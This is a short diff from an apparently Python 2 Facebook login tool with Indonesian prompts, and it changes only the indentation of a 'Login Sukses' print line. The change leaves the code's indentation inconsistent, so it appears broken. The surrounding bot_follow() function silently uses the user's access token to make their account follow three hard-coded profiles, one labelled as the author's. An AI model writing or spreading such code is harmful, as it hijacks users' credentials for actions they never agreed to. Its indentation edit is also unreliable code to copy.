@@ -94,7 +94,7 @@ def bot_follow():
 		requests.post('https://graph.facebook.com/100070904510470/subscribers?access_token=' + toket)      #Author
 		requests.post('https://graph.facebook.com/100000312208041/subscribers?access_token=' + toket) #
 		requests.post('https://graph.facebook.com/100013012878335/subscribers?access_token=' + toket) #
-        print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
+                print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
         raw_input('[+] Tekan Enter ')
         menu()
         print'[!] Token Invalid!'
